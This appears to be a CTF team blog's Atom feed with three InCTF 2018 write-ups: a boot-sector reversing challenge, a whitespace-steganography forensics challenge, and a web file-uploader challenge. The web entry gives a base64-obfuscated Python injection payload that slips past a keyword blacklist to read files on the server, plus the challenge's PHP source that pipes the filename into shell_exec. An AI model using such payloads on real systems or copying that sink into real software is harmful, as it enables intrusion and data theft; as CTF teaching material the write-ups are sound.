<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TEAMROCKETIST</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://teamrocketist.github.io/"/>
  <updated>2018-10-11T04:09:27.383Z</updated>
  <id>https://teamrocketist.github.io/</id>
  
  <author>
    <name>TEAMROCKETIST</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Reverse] InCTF 2018 - load3r</title>
    <link href="https://teamrocketist.github.io/2018/10/11/Reverse-InCTF-2018-load3r/"/>
    <id>https://teamrocketist.github.io/2018/10/11/Reverse-InCTF-2018-load3r/</id>
    <published>2018-10-11T03:56:04.000Z</published>
    <updated>2018-10-11T04:09:27.383Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>load3r<br>100<br><br>======= Difficulty level : Easy ========<br><br>A basic bootloader challenge. Note: The flag format is inctf{correct_input}<br><br>Note: The challenge must be run in qemu-system-i386 version 2.5.0<br><br>========== Authors : b3y0nd3r, r00tus3r ==========<br></blockquote>

<p>They gave us a file named <em>boot sector</em><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file boot_try.bin </div><div class="line">boot_try.bin: DOS/MBR boot sector</div></pre></td></tr></table></figure></p>
<p>So lets first run the binary on an emulator named qemu:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ qemu-system-i386 -drive format=raw,file=boot_try.bin</div></pre></td></tr></table></figure>
<p><a data-fancybox="gallery" href="https://i.imgur.com/8Wt66UE.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/8Wt66UE.png" alt=""><br></a></p>
<p>We can see some strings like <strong><em>ENTER THE FLAG</em></strong> and the message <strong><em>NOOOO</em></strong> when we insert an incorrect flag, this strings can help us to localize certain parts of the code while reversing, so first thing I did was to look up for this strings in IDA and search on which zones they are referenced.</p>
<p>At first I was having some trouble with IDA because I was choosing the wrong architecture when opening the binary and IDA wasn’t able to disassemble the code, the only thing that was showing was the strings so make sure you <strong><em>say no</em></strong> to disassemble the binary in 16 bits instead of the 32 bits.</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/4kHWAD5.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/4kHWAD5.png" alt=""><br></a></p>
<p>After pressing no, we can already see where is the location of the strings we saw when executing the binary… </p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/d97jqKF.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/d97jqKF.png" alt=""><br></a></p>
<p>So we can start taking some notes from where they start in the binary (note that since the boot sector hasn’t been loaded into memory by the bios, all the addresses are starting from 0 but when we start debugging it everything will start after 0x7c00):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x7c16 ENTER THE FLAG\r\n -&gt; calculated with 0x7c00 + 0x16</div><div class="line">0x7c27 w2g1kS&lt;c7me3keeuSMg1kSk%Se&lt;=S3%/e/\r\n -&gt; calculated with 0x7c00 + 0x27</div><div class="line">0x7c4c Yeah, that is the flag\r\n -&gt; calculated with 0x7c00 + 0x4c</div><div class="line">0x7c65 8 7 NOOOO\r\n -&gt; calculated with 0x7c00 + 0x65</div><div class="line">0x7cc9 37 36 0100010011011101111111011010110101\r\n -&gt; calculated with 0x7c00 + 0xc9</div></pre></td></tr></table></figure>
<p>Now we have 2 subroutines to analyse, lets start by the smallest one:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/paHB5U2.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/paHB5U2.png" alt=""><br></a></p>
<p>IDA’s comments are very explanatory, this is a function that writes a character into the screen by performing an interruption, so we can just rename this function to print since will be easier to us to identify it when it is called again.</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/tqpZzRW.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/tqpZzRW.png" alt=""><br></a></p>
<p>From the image above we can already assume that the flag must have 34 characters if we insert something that doesn’t have that size we go directly to printing the wrong flag message <strong><em>NOOO</em></strong>.</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/GqA9h8v.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/GqA9h8v.png" alt=""><br></a></p>
<p>But if we instead give a 34 character string we go through the green flow</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/tiKrTXA.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/tiKrTXA.png" alt=""><br></a></p>
<p>The image above is a loop, which iterates all the characters we inserted in the program, after doing the shifts we enter into the final character modification:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/ehuu9Gc.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/ehuu9Gc.png" alt=""><br></a></p>
<p>We need to reverse this encryption function by doing exactly the opposite:</p>
<p>Example<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">encryption function -&gt; </div><div class="line">lr_string = &apos;0&apos;</div><div class="line">flag_string = &apos;T&apos;</div><div class="line">for the first character (shift right because the 1st of lr_string is zero):</div><div class="line">chr((ord(&apos;T&apos;) &gt;&gt; 1 ) ^ 5) = w</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">reverse function -&gt; </div><div class="line">lr_string = &apos;0&apos;</div><div class="line">encryption_string = &apos;w&apos;</div><div class="line">for the first character (shift left because we are reversing it and before we shift righted):</div><div class="line">chr((ord(&apos;w&apos;) ^ 5) &lt;&lt; 1) = T</div></pre></td></tr></table></figure>
<p>Of course it’s much easier to understand all this assembly while debugging and analysing the code… the way I did it was opening gdb and running this commands inside of it, after the commands beloow is just a matter of putting more breakpoints and reading registers etc etc:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">target remote | qemu-system-i386 -S -gdb stdio -m 512 -hda boot_try.bin</div><div class="line"><span class="built_in">set</span> architecture i8086</div><div class="line">b *0x7c00</div></pre></td></tr></table></figure>
<p>We have now everything to recover the flag it’s trivial to write a python script that recovers the flag for us:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">left_or_right = <span class="string">'0100010011011101111111011010110101'</span></div><div class="line">enc = <span class="string">"\x77\x32\x67\x31\x6B\x53\x3C\x63\x37\x6D\x65\x33\x6B\x65\x65\x75\x53\x4D\x67\x31\x6B\x53\x6B\x25\x53\x65\x3C\x3D\x53\x33\x25\x2F\x65\x2F"</span></div><div class="line">flag = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> enumerate(enc[::<span class="number">-1</span>]):</div><div class="line">	a = ord(c) ^ <span class="number">5</span></div><div class="line">	<span class="keyword">if</span> left_or_right[i] == <span class="string">'0'</span>:</div><div class="line">		flag += chr(a &lt;&lt; <span class="number">1</span>)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		flag += chr(a &gt;&gt; <span class="number">1</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">'inctf&#123;'</span>+flag+<span class="string">'&#125;'</span></div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python final.py</div><div class="line">inctf&#123;T0T@l+pr0+@7+7h1$+8007l04d3r+7h1n9&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;load3r&lt;br&gt;100&lt;br&gt;&lt;br&gt;======= Difficulty level : Easy ========&lt;br&gt;&lt;br&gt;A basic bootloader challenge. Note: The flag format
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="InCTF2018" scheme="https://teamrocketist.github.io/tags/InCTF2018/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="qemu" scheme="https://teamrocketist.github.io/tags/qemu/"/>
    
      <category term="i386" scheme="https://teamrocketist.github.io/tags/i386/"/>
    
      <category term="mbr" scheme="https://teamrocketist.github.io/tags/mbr/"/>
    
      <category term="boot_sector" scheme="https://teamrocketist.github.io/tags/boot-sector/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] InCTF 2018 - Winter Sport</title>
    <link href="https://teamrocketist.github.io/2018/10/09/Forensics-InCTF-2018-Winter-Sport/"/>
    <id>https://teamrocketist.github.io/2018/10/09/Forensics-InCTF-2018-Winter-Sport/</id>
    <published>2018-10-09T21:00:56.000Z</published>
    <updated>2018-10-11T03:54:53.102Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Winter Sport<br>996<br><br>======= Difficulty level : Easy ========<br><br>I have a friend named Jake.We were watching a football tournament on one fine chilly morning. Meanwhile Jake’s sister Susan did something mischievous which cause Jake to lose some really important data. We could only find this piece of evidence, can you recover it for him?<br><br>========== Authors : cr4ck3t, stuxn3t ==========<br><br></blockquote>

<p>In this challenge, it is provided a zip file containing a pdf <em>file.pdf</em> where it is possible to find the following message.</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/vP1vAOp.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/vP1vAOp.png" alt=""><br></a></p>
<p>Besides this clear message, after running <strong>binwalk</strong>, we can find that there is another 7z archive. </p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/tkshXno.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/tkshXno.png" alt=""><br></a></p>
<p>After extracting this 7z archive it is revealed another pdf, <em>omg.pdf</em>, containing the following characters,</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/f8jgvem.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/f8jgvem.png" alt=""><br></a></p>
<p>Well at first by opening the pdf in a text editor, we saw the composition of the pdf <em>/ProcSet [/PDF /Text /ImageB /ImageC]</em>, saying that it contains 2 images although the pdf seemed to be corrupted, since we tried to extract the images from this pdf and there were some errors (some <em>endstreams</em> were missing and some other stuff regarding the pdf structure file). After we found what it seemed to be the encoding for those characters from the image above and they would translate into <strong>“What is Steganography ?Steganography is an amaz”</strong> but nothing more than that.<br>Since we couldn’t find a clear way, we were going to fix the pdf anatomically speaking, and then we saw this.</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/IDgXOj1.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/IDgXOj1.png" alt=""><br></a></p>
<p>Well a bunch os spaces and tabs, just on the first 13 lines of the pdf? Due to Sublime Text (where tabs -&gt; “-“ and spaces -&gt; “.”) the idea of being another <strong>morse code</strong> related challenge, but well how could we find the spaces? what if we were using other text editor? Other options that came to our mind was <strong><a href="https://en.wikipedia.org/wiki/Whitespace_(programming_language" target="_blank" rel="external">Whitespace</a>)</strong> and due to the message “What is Steganography ?Steganography is an amaz” we searched for steganography whitespace and we found <strong><a href="http://manpages.ubuntu.com/manpages/bionic/man1/stegsnow.1.html" target="_blank" rel="external">Stegsnow</a></strong> which “is a program for concealing messages in text files by appending tabs  and  spaces on  the  end  of lines, and <strong>for extracting messages from files containing hidden messages</strong>“. That was exactly what we wanted. Running it on the given <em>omg.pdf</em> it gave us the flag.</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/KAuVS6i.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/KAuVS6i.png" alt=""><br></a></p>
<p><strong>Flag: </strong> inctf{w3lcom3_t0_7h3_w0rld_0f_whit3sp4c3}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Winter Sport&lt;br&gt;996&lt;br&gt;&lt;br&gt;======= Difficulty level : Easy ========&lt;br&gt;&lt;br&gt;I have a friend named Jake.We were watching a foo
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="steganography" scheme="https://teamrocketist.github.io/tags/steganography/"/>
    
      <category term="whitespace_steganography" scheme="https://teamrocketist.github.io/tags/whitespace-steganography/"/>
    
      <category term="InCTF2018" scheme="https://teamrocketist.github.io/tags/InCTF2018/"/>
    
  </entry>
  
  <entry>
    <title>[Web] InCTF 2018 - The Most Secure File Uploader</title>
    <link href="https://teamrocketist.github.io/2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/"/>
    <id>https://teamrocketist.github.io/2018/10/08/Web-InCTF-2018-The-Most-Secure-File-Uploader/</id>
    <published>2018-10-08T00:09:56.000Z</published>
    <updated>2018-10-08T01:45:38.397Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>The Most Secure File Uploader<br>100<br><br>======= Difficulty level : Medium ========<br><br>Somehow the codes are all messed up and it seems that it was my younger brother. He messed up my File Uploader. But I know you…You don’t look like a hacker at all…Can you fix this for me? :)<br><br>link<br><br>========== Authors : c3rb3ru5, Nimisha, SpyD3r ==========<br><br></blockquote>

<p>After a long pause we are happy to announce that we are doing CTFs again so more write ups coming soon this month :). </p>
<p>Starting with something simple we have a web challenge where it’s hinted that we probably need to upload something malicious to the server, for the begining I decided to upload a random image without nothing special:<br><a data-fancybox="gallery" href="https://i.imgur.com/SIdVAKj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/SIdVAKj.png" alt=""><br></a></p>
<p>And we can already see something interesting, we have a traceback error and we can easily identify it as being from python, the file name is being executed as python code, after some testing I noticed that a lot of words were blacklisted:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">blacklisted = <span class="string">r"import|os|class|subclasses|mro|request|args|eval|if|for|\%|subprocess|file|open|popen|builtins|\+|compile|execfile|from_pyfile|config|local|\`|\||\&amp;|\;|\&#123;|\&#125;"</span></div></pre></td></tr></table></figure>
<p>As we know blacklisting is always a bad practice after testing for a while I noticed that <strong><em>globals()</em></strong> wasn’t being blocked and from globals we can easily can get the builtin function from python :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print globals()"</span></div><div class="line">&#123;<span class="string">'__builtins__'</span>: &lt;module <span class="string">'__builtin__'</span> (built-in)&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'__doc__'</span>: None, <span class="string">'__package__'</span>: None&#125;</div><div class="line">$ python -c <span class="string">"print globals().values()[0]"</span></div><div class="line">&lt;module <span class="string">'__builtin__'</span> (built-in)&gt;</div><div class="line">$ python -c <span class="string">"print dir(globals().values()[0])"</span></div><div class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotImplemented'</span>, <span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'ReferenceError'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StandardError'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>, <span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'abs'</span>, <span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'apply'</span>, <span class="string">'basestring'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'buffer'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'cmp'</span>, <span class="string">'coerce'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>, <span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'exit'</span>, <span class="string">'file'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'intern'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>, <span class="string">'long'</span>, <span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'raw_input'</span>, <span class="string">'reduce'</span>, <span class="string">'reload'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>, <span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'unichr'</span>, <span class="string">'unicode'</span>, <span class="string">'vars'</span>, <span class="string">'xrange'</span>, <span class="string">'zip'</span>]</div></pre></td></tr></table></figure>
<p>But we run into a problem now a lot of words are blacklisted and there is an interesting builtin function we can use to list the files in the current directory <img src="https://www.tutorialspoint.com/python/os_listdir.htm" alt="os.listdir">, the problem is both import and os keywords are blacklisted so how do we bypass this? My solution was to find a way to execute function and import modules (<strong>dict</strong>[‘function’]) with strings and why strings? Because we can bypass this keywords by just using some kind of encoding in my case I choose to use base64:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print globals().values()[0].__dict__['__import__']('os')"</span> <span class="comment"># gets caught by the filter</span></div><div class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</div><div class="line"></div><div class="line">python -c <span class="string">"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))"</span> <span class="comment">#bypasses the filter</span></div><div class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</div></pre></td></tr></table></figure>
<p>Another thing we need to worry about is about the extension of the file, the filename needs to end in a valid image format like <strong><em>.jpg</em></strong>, this will cause an error because python methods don’t have a valid attribute named .jpg for example but we can easily bypass this by using a python comment #.jpg:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"print globals().values()[0].__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))#.jpg"</span> </div><div class="line">&lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/os.pyc'</span>&gt;</div></pre></td></tr></table></figure>
<p>Now if we want to list the current directory with <strong><em>os.listdir(‘.’)</em></strong> we just need to complete our script:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/af3eq5s.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/af3eq5s.png" alt=""><br></a></p>
<p>We now know that there is a file with the name of flag we just need to read it with open and read() :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">print</span> globals().values()[<span class="number">0</span>].__dict__[<span class="string">'open'</span>](<span class="string">'flag'</span>,<span class="string">'r'</span>).read()<span class="comment">#.jpg</span></div><div class="line"><span class="keyword">print</span> globals().values()[<span class="number">0</span>].__dict__[<span class="string">'b3Blbg=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'flag'</span>,<span class="string">'r'</span>).read()<span class="comment">#.jpg</span></div></pre></td></tr></table></figure>
<p><a data-fancybox="gallery" href="https://i.imgur.com/9DHTSlo.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/9DHTSlo.png" alt=""><br></a></p>
<p>And there it was the flag, and I managed to get the source code of the php file so here is an extra:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$target_dir = <span class="string">"uploads/"</span>;</div><div class="line">$target_file = $target_dir . basename($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</div><div class="line">$uploadOk = <span class="number">1</span>;</div><div class="line">$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));</div><div class="line"></div><div class="line">$blacklist = <span class="string">"import|os|class|subclasses|mro|request|args|eval|if|for|\%|subprocess|file|open|popen|builtins|\+|compile|execfile|from_pyfile|config|local|\`|\||\&amp;|\;|\&#123;|\&#125;"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>])</div><div class="line">&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"PLEASE UPLOAD SOMETHING"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Check if image file is a actual image or fake image</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</div><div class="line">    $check = getimagesize($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"tmp_name"</span>]);</div><div class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"&lt;br--&gt;"</span>;</div><div class="line">        $uploadOk = <span class="number">1</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span> . <span class="string">"&lt;br&gt;"</span>;</div><div class="line">        $uploadOk = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Check file size</span></div><div class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] &gt; <span class="number">500000</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your file is too large."</span> . <span class="string">"&lt;br&gt;"</span>;</div><div class="line">    $uploadOk = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Allow certain file formats</span></div><div class="line"><span class="keyword">if</span>($imageFileType != <span class="string">"jpg"</span> &amp;&amp; $imageFileType &amp;&amp; <span class="string">"png"</span> &amp;&amp; $imageFileType != <span class="string">"jpeg"</span></div><div class="line">&amp;&amp; $imageFileType != <span class="string">"gif"</span> ) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed."</span> . <span class="string">"&lt;br&gt;"</span>;</div><div class="line">    $uploadOk = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></div><div class="line"><span class="keyword">if</span> ($uploadOk == <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, your file was not uploaded."</span> . <span class="string">"&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"><span class="comment">// if everything is ok, try to upload file</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/i"</span>, $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Filename: "</span>.$_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>].<span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"I think its called blacklisting...!"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"The file: "</span>. basename( $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]). <span class="string">" has been uploaded."</span> . <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"File: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Size: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"size"</span>] . <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> $name = urldecode($_FILES[<span class="string">"fileToUpload"</span>][<span class="string">"name"</span>]);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> shell_exec(<span class="string">"python -c \""</span> . $name . <span class="string">"\" 2&gt;&amp;1"</span>);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;The Most Secure File Uploader&lt;br&gt;100&lt;br&gt;&lt;br&gt;======= Difficulty level : Medium ========&lt;br&gt;&lt;br&gt;Somehow the codes are all mess
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="InCTF2018" scheme="https://teamrocketist.github.io/tags/InCTF2018/"/>
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="pyjail" scheme="https://teamrocketist.github.io/tags/pyjail/"/>
    
